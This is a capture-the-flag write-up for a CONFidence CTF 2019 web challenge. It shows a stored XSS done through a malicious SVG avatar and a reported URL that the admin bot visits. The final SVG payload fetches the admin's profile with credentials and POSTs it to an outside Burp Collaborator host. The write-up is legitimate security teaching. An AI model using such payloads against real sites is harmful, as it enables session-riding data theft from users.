
Teaser CONFidence CTF 2019: Web 50
==================================

Challenge description:

	idk what this site does, but you can put some secret, shoe size and report it to the admin...

We are given a URL. When we visit it we find the following screen:

![](pics/1.png?raw=true)

From the source code, it seems to be user and password. Let's try some random values, like `fabada`/`fabada123` and submit the form. 

Apparently we're in:

![](pics/2.png?raw=true)

Let's check the _Profile_ section:

![](pics/3.png?raw=true)

Here we can define some values that will be sent to the server with a POST to `/profile/fabada`. We try clearing cookies and logging in again, and we find that the values are kept. Therefore, we effectively created an account at the platform, and our profile can be found at `/profile/<USERNAME>`. Interestingly enough, we can upload a file as the avatar, but they are controlling that the file is actually an image. We'll keep an eye out for that...

Let's now check the _Report_ section:

![](pics/4.png?raw=true)

We found that in this screen we can submit a URL belonging to this domain. Actually not every single one, but i.e. profiles are allowed. We try sending our own profile and we get the following response:

![](pics/5.png?raw=true)

Mmh do we now what that means? Starts sounding like a client-side attack... This probably means that we can  make the admin visit our own profile. Talking about `admin`, let's try and see if he has his own profile:

![](pics/6.png?raw=true)

Yes he does! But we don't get the option to edit any field as with our own profile (obviously). We try checking our own profile with a different account, and we confirm that that's how profiles for other users are displayed.

Let's now look for the client-side attack. Back to our own profile, we try several XSS payloads in the different fields. In the end, found an attack vector by uploading an SVG with embedded Javascript (size needs to be 100x100, as pointed out by the returned error if we try other sizes, so we directly grabbed one from Google Images):

```
<?xml version="1.0" encoding="UTF-8"?> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" x="0px" y="0px" width="100px" height="100px" viewBox="-12.5 -12.5 100 100" xml:space="preserve"> 
  ...
  <g>
    <polygon fill="#00B0D9" points="41.5,40 38.7,39.2 38.7,47.1 41.5,47.1 "></polygon>
    <script type="text/javascript">
      alert('XSS!');
    </script>
  </g>
  ...
</svg>

```

After uploading the image, the profile is shown and nothing happens:

![](pics/7.png?raw=true)

Visiting the image's URL, however...

![](pics/8.png?raw=true)

Nice! Hopefully we can submit this for the admin to check out? Yes we can. The full generated URL is something of the sort:

`http://web50.zajebistyc.tf/avatar/82b956e443066b3179e9493507c12344a87585d36d3aa92ae02710b1f1d1da5f/fabada_avatar.svg`

![](pics/5.png?raw=true)

How can we leverage this to compromise the admin? We tried two failed approaches:

1. Send ourselves some `document.cookies` from the admin? Nope, the session cookie is `HttpOnly`.
2. Within the XSS payload, trigger an authenticated POST request to `/profile/admin` modifying the `secret` parameter. We believed that was the password, and therefore we could take over the admin account. We then found out that was not the case... Maybe `secret` is the flag itself for the `admin` user!

We then realized that maybe we could trigger a GET request to `/profile/admin` from the admin's browser obtaining the profile's "full version" including the secret. We could then redirect the response to this request to our own server (in this case, we used Burp Collaborator).

The payload:

```
<?xml version="1.0" encoding="UTF-8"?> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" x="0px" y="0px" width="100px" height="100px" viewBox="-12.5 -12.5 100 100" xml:space="preserve"> 
  ...
  <g>
    <polygon fill="#00B0D9" points="41.5,40 38.7,39.2 38.7,47.1 41.5,47.1 "></polygon>
    <script type="text/javascript">
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          var xhr2 = new XMLHttpRequest();
          xhr2.open("POST", "http://XXXX.burpcollaborator.net/");
          xhr2.send(xhr.responseText);
        }
      }   
      xhr.open("GET", "http://web50.zajebistyc.tf/profile/admin");
      xhr.withCredentials = true;
      xhr.send();
    </script>
  </g>
  ...
</svg>

```

After reporting the URL for our brand new uploaded malicious SVG, a request was received by the Collaborator which included the flag!

![](pics/9.png?raw=true)


